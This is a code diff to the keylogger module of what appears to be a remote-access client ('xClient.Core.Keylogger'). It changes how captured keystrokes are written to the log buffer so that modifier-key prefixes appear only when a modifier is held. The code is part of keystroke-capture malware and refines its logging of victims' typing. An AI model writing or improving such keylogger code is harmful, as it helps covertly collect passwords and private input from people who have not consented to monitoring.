@@ -221,14 +221,21 @@ namespace xClient.Core.Keylogger
                         default:
                             if (_enumValues.Contains(k.Value))
                             {
-                                _logFileBuffer.Append(
-                                    HighlightSpecialKey(
-                                        ((k.ShiftKey)   ? "SHIFT-" : string.Empty) +
-                                        ((k.ControlKey) ? "CTRL-"  : string.Empty) +
-                                        ((k.AltKey)     ? "ALT-"   : string.Empty) +
-                                        ((k.EscapeKey)  ? "ESC-"   : string.Empty) +
-                                        FromKeys(k.Value, k.ShiftKey, k.CapsLock)
-                                        ));
+                                if (k.ShiftKey || k.ControlKey || k.AltKey || k.EscapeKey)
+                                {
+                                    _logFileBuffer.Append(
+                                        HighlightSpecialKey(
+                                            ((k.ShiftKey)   ? "SHIFT-" : string.Empty) +
+                                            ((k.ControlKey) ? "CTRL-"  : string.Empty) +
+                                            ((k.AltKey)     ? "ALT-"   : string.Empty) +
+                                            ((k.EscapeKey)  ? "ESC-"   : string.Empty) +
+                                            FromKeys(k.Value, k.ShiftKey, k.CapsLock)
+                                            ));
+                                }
+                                else
+                                {
+                                    _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
+                                }
                             }
                             break;
                     }
